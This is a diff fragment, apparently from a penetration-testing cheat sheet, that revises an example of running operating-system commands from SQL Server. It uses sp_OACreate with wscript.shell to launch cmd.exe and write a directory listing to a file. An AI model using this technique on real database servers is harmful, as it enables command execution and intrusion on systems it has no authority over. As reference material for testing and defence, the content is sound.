@@ -92,9 +92,10 @@ EXEC sp_OAMethod @shell, 'Run', @result OUTPUT, 'cmd.exe /c dir C:\ > C:\output.
 EXEC sp_OADestroy @shell;
 
 -- Alternative syntax using SP_OACREATE (simpler)
-DECLARE @execmd INT
-EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
-EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
+DECLARE @execmd INT;
+EXEC sp_OACreate 'wscript.shell', @execmd OUTPUT;
+EXEC sp_OAMethod @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c dir C:\ > C:\output.txt';
+EXEC sp_OADestroy @execmd;
 ```
 
 ### Custom Extended Stored Procedures
